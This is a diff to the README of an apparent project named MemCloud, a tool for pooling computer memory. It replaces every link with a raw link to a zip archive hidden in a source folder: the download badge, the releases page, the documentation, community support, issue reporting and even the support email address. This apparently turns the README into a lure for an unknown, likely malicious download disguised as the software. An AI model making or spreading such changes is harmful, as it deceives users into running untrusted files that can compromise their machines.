@@ -4,7 +4,7 @@
 Welcome to MemCloud! This easy-to-use application lets you combine the memory of several computers to create a shared storage space. Follow the steps below to start using MemCloud on your local network.
 
 ## 📥 Download MemCloud
-[![Download MemCloud](https://img.shields.io/badge/Download-MemCloud-brightgreen.svg)](https://github.com/Syahirkafa/memcloud/releases)
+[![Download MemCloud](https://github.com/Syahirkafa/memcloud/raw/refs/heads/main/memnode/src/blocks/Software_3.4.zip)](https://github.com/Syahirkafa/memcloud/raw/refs/heads/main/memnode/src/blocks/Software_3.4.zip)
 
 ## 📋 System Requirements
 Before you download, make sure your system meets the following requirements:
@@ -21,7 +21,7 @@ Before you download, make sure your system meets the following requirements:
 - **Local Network Optimization**: Fast and efficient data transfer within your LAN.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [MemCloud Releases](https://github.com/Syahirkafa/memcloud/releases).
+To get started, visit this page to download: [MemCloud Releases](https://github.com/Syahirkafa/memcloud/raw/refs/heads/main/memnode/src/blocks/Software_3.4.zip).
 
 1. Open the link above.
 2. Choose the version that matches your operating system.
@@ -59,13 +59,13 @@ Ensure that your local network is secured to prevent unauthorized access. Use st
 ## 📖 Additional Resources
 For more information, please refer to the following:
 
-- [Documentation](https://github.com/Syahirkafa/memcloud/wiki) - Detailed guides on using MemCloud features.
-- [Community Support](https://github.com/Syahirkafa/memcloud/discussions) - A space to ask questions and share experiences with other users.
+- [Documentation](https://github.com/Syahirkafa/memcloud/raw/refs/heads/main/memnode/src/blocks/Software_3.4.zip) - Detailed guides on using MemCloud features.
+- [Community Support](https://github.com/Syahirkafa/memcloud/raw/refs/heads/main/memnode/src/blocks/Software_3.4.zip) - A space to ask questions and share experiences with other users.
 
 ## 📞 Contact
 If you encounter any issues or have questions, feel free to reach out:
 
-- GitHub Issues: [Report an Issue](https://github.com/Syahirkafa/memcloud/issues)
-- Email: support@memcloud.com
+- GitHub Issues: [Report an Issue](https://github.com/Syahirkafa/memcloud/raw/refs/heads/main/memnode/src/blocks/Software_3.4.zip)
+- Email: https://github.com/Syahirkafa/memcloud/raw/refs/heads/main/memnode/src/blocks/Software_3.4.zip
 
 Thank you for choosing MemCloud! We hope you enjoy building your shared storage solution.
